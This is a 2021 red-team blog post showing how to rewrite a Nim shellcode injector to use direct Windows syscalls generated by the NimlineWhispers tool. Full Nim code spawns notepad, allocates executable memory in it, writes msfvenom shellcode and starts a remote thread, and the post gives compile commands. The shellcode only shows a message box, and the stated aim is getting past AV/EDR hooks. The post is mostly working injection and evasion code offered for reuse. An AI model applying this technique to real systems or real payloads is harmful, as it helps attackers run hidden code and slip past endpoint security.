---
layout: single
title:  "Shellcode Injection using Nim and Syscalls"
date:   2021-01-19 10:04:54 +0000
categories: nim
tags: nim syscalls nimlinewhispers
excerpt: "" #"Using NimlineWhispers to create a registry modifying executable written in Nim."
permalink: /:categories/:title/

header:
  overlay_image: /images/2021-01-19-nim/banner.png
  overlay_filter: rgba(0, 0, 0, 0.7)
  actions:
    - label: "View Code"
      url: "https://github.com/ajpc500/NimExamples/"
  
---
Fresh from a Syscalls-fuelled [BOF](https://www.cobaltstrike.com/help-beacon-object-files) [joyride](https://github.com/ajpc500/BOFs), I had a chance to play with Nim. In particular, I was intrigued by a tweet from [@byt3bl33d3r](https://twitter.com/byt3bl33d3r):

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">omg.... I did it! Win32 Syscalls from Nim!!! 😍 <a href="https://t.co/h8XeM5062a">pic.twitter.com/h8XeM5062a</a></p>&mdash; Marcello (@byt3bl33d3r) <a href="https://twitter.com/byt3bl33d3r/status/1348824008670597123?ref_src=twsrc%5Etfw">January 12, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

My immediate thought was that this looked syntactically similar to the inline assembly outputted by Outflank's [InlineWhispers](https://github.com/outflanknl/InlineWhispers), and that we could achieve a similar thing for Nim. A few hours (and many nested for-loops) later, we have a proof-of-concept version of [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers).

This blog will walk through a process of using NimlineWhispers to port an existing Nim project to use Syscalls and Native APIs.

## Initial Code

For our project, we'll use an example from Marcello's fantastic [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim/) repo, specifically [this](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_bin.nim) one. If you haven't had a play with Nim yet, Marcello's repo is a gold mine of information for installation, compilation, code examples and opsec tips - I highly recommend taking a look.

The code example we'll use spawns a target process, in this case `notepad.exe`, and uses the classic CreateRemoteThread injection technique to allocate memory, write and launch our calc-popping shellcode in that process. The original code can be seen below:

{% highlight nim %}
#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
]#

import winim/lean
import osproc

proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =

    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    echo "[*] WriteProcessMemory: ", bool(wSuccess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        NULL, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"

when defined(windows):

    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        # ./msfvenom -p windows/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x86 process"
        var shellcode: array[272, byte] = [
        byte 0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,0x8b,
        ...
        0x10,0x89,0xe1,0x31,0xd2,0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,
        0x55,0x08]

    elif defined(amd64):
        # ./msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x64 process"
        var shellcode: array[295, byte] = [
        byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
        ...
        0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,
        0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]

    # This is essentially the equivalent of 'if __name__ == '__main__' in python
    when isMainModule:
        injectCreateRemoteThread(shellcode)
{% endhighlight %}

For simplicity, we're going to spawn the `notepad.exe` process as normal and just focus on porting the injection steps to our Syscalls functions.





## Converting to Native functions

We won't go into the depths of high-level vs Native API calls, mainly because people that understand it infinitely more than me have put out [great](https://jhalon.github.io/utilizing-syscalls-in-csharp-1/) [material](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/) on the subject already, particular with regards to its offensive applications.

For our purposes, we know though that our high-level functions need to be replaced with the following Native API calls:

- `OpenProcess` -> `NtOpenProcess`
- `VirtualAllocEx` -> `NtAllocateVirtualMemory`
- `WriteProcessMemory` -> `NtWriteVirtualMemory`
- `CreateRemoteThread` -> `NtCreateThreadEx`
- `CloseHandle` -> `NtClose`

These functions will require slightly different arguments and data structures. Resources such as [NTAPI Undocumented Functions](http://undocumented.ntinternals.net/) are invaluable for giving us insight into what we need to define to get this off the ground, e.g. the `CLIENT_ID` and `OBJECT_ATTRIBUTES` structs needed for [NtOpenProcess](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FNtOpenProcess.html).







## Using NimlineWhispers

With our list of required native functions, we can generate our inline assembly. Firstly, clone the `NimlineWhispers` repository:

`git clone https://github.com/ajpc500/NimlineWhispers.git`

Modify `functions.txt` to include our five Native API functions:
```
NtCreateThreadEx
NtOpenProcess
NtAllocateVirtualMemory
NtWriteVirtualMemory
NtClose
```
Run `NimlineWhispers` using the following command:

`python3 NimlineWhispers`

![NimlineWhispers](/images/2021-01-19-nim/nimlinewhispers.png)

This will produce us a `syscalls.nim` file, complete with the `{.passC:"-masm=intel".}` header we'll need to compile this with inline assembly.

To integrate this with our existing code, add it to the same directory and append `include syscalls` to the end of our imports, as below.


{% highlight nim %}
#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
]#

import winim/lean
import osproc
include syscalls      <-- syscalls lib

proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =
...
{% endhighlight %}

> It's worth mentioning here that [SysWhispers](https://github.com/jthuraisamy/SysWhispers/blob/master/example-output/syscalls.h) provides us with 64-bit assembly only, and as we're feeding that into NimlineWhispers, that too is 64-bit only. 

## Adapting the Code

Now we can set about adding the necessary code to our project to call the inline assembly Native functions we've included. Once `syscalls.nim` has been added to the project, we can call our Native functions as normal, e.g. see the below for `NtOpenProcess`.

{% highlight nim %}
var cid: CLIENT_ID
var oa: OBJECT_ATTRIBUTES
var pHandle: HANDLE

cid.UniqueProcess = tProcess.processID

var status = NtOpenProcess(
    &pHandle,
    PROCESS_ALL_ACCESS, 
    &oa, &cid         
)
{% endhighlight %}

Working through the project and adding the necessary variables and functions, we end up with code something like the below:

{% highlight nim %}
#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
]#

import winim/lean
import osproc
include syscalls

proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =

    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)

    cid.UniqueProcess = tProcess.processID

    var status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo "[*] pHandle: ", pHandle

    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE);

    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr shellcode, 
        sc_size-1, 
        addr bytesWritten);

    echo "[*] WriteProcessMemory: ", status
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, FALSE, 0, 0, 0, NULL);

    status = NtClose(tHandle)
    status = NtClose(pHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"

when defined(windows):

    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        echo "[!] This is only for 64-bit use. Exiting..."
        return 

    elif defined(amd64):
        # ./msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x64 process"
        var shellcode: array[295, byte] = [
        byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
        ...
        0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,
        0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]

    # This is essentially the equivalent of 'if __name__ == '__main__' in python
    when isMainModule:
        injectCreateRemoteThread(shellcode)

{% endhighlight %}

Now we can compile this with the following command:

`nim c -d=mingw --app=console --cpu=amd64 SysCallsMessageBoxShellCodeInject.nim`

If you give that a try, you'll likely see the following output:

![Missing Structs](/images/2021-01-19-nim/missing_structs.png)

## Additional Structs

So, what's gone wrong here? While we're not calling the functions provided by [Winim](https://github.com/khchen/winim/tree/master/winim), we're still including it for all of the structs provided in `windef.nim` [here](https://github.com/khchen/winim/blob/master/winim/inc/windef.nim). Except, we need two additional structs.

Specifically, `PS_ATTRIBUTE` and `PS_ATTRIBUTE_LIST`. We can take the definitions of these structs from [@Jackson_T's](https://twitter.com/Jackson_T) [SysWhispers](https://github.com/jthuraisamy/SysWhispers/blob/master/example-output/syscalls.h) project add these to the top of our `syscalls.nim` file.

{% highlight nim %}
type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
{% endhighlight %}

If we attempt to recompile now:

![Compilation](/images/2021-01-19-nim/compiled.png)

Success! Running our compiled executable now, we should get our successful MessageBox.

![MessageBox](/images/2021-01-19-nim/pop.png)




# Conclusions

In this blog, we've seen how we can adapt a Nim project to use native API functions, included in our project as inline assembly and generated using [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers). It's fair to say the tool is very much a proof-of-concept, in part because I'm still learning Nim😅 For me the obvious next step, and one also raised by [Cas van Cooten](https://twitter.com/chvancooten), is to include the needed data types and structs as part of the NimlineWhispers `syscalls.nim` output. This would allow you to use that output without also importing the [Winim](https://github.com/khchen/winim/tree/master/winim) package and wrestling with any missing structs.

Hopefully, this is helpful for those looking to integrate Syscalls into Nim projects, i'm very keen to improve NimlineWhispers, so pull requests are very welcome!